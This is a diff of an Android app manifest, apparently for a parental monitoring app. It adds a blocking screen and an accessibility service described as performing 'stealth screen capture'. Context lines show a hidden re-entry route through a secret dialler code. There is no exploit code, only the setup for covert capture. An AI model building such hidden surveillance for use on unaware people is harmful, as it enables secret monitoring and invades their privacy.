@@ -58,6 +58,13 @@
             android:excludeFromRecents="true"
             android:exported="false" />
 
+        <activity
+            android:name=".ui.block.BlockActivity"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:launchMode="singleTask"
+            android:exported="false" />
+
         <!-- Secret re-entry: parent dials *#1234# -->
         <activity
             android:name=".ui.dialer.DialerEntryActivity"
@@ -87,6 +94,19 @@
         <service
             android:name=".services.ScreenCaptureService"
             android:exported="false" />
+
+        <!-- Guardian Accessibility Service for Stealth Screen Capture -->
+        <service
+            android:name=".services.GuardianAccessibilityService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
 
         <!-- Boot receiver -->
         <receiver
